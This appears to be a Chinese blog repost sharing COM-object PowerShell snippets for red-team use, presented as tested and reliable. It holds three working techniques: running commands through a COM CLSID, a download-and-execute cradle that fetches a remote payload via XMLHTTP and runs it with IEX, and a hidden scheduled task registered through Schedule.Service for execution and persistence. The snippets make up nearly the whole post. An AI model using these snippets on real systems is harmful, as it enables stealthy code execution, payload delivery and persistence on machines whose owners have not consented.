> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0pvgWjkjAu_-cHWOzx7YKA)

分享红队行动中常用的 Com 组件，效果自测，绝对好用。

```
$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID("E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E"))
$handle.CommandLine = "cmd /c whoami"
$handle.Start([ref]$True)
```

```
$o = [activator]::CreateInstance([type]::GetTypeFromCLSID("F5078F35-C551-11D3-89B9-0000F81FE221")); $o.Open("GET", "http://127.0.0.1/payload", $False); $o.Send(); IEX $o.responseText;
```

```
$TaskName = [Guid]::NewGuid().ToString()
$Instance = [activator]::CreateInstance([type]::GetTypeFromProgID("Schedule.Service"))
$Instance.Connect()
$Folder = $Instance.GetFolder("\")
$Task = $Instance.NewTask(0)
$Trigger = $Task.triggers.Create(0)
$Trigger.StartBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay))
$Trigger.EndBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
$Trigger.ExecutionTimelimit = "PT5M"
$Trigger.Enabled = $True
$Trigger.Id = $Taskname
$Action = $Task.Actions.Create(0)
$Action.Path = “cmd.exe”
$Action.Arguments = “/c whoami”
$Action.HideAppWindow = $True
$Folder.RegisterTaskDefinition($TaskName, $Task, 6, "", "", 3)

function Convert-Date {       

        param(
             [datetime]$Date

        )       

        PROCESS {
               $Date.Touniversaltime().tostring("u") -replace " ","T"
        }
}
```

from：https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html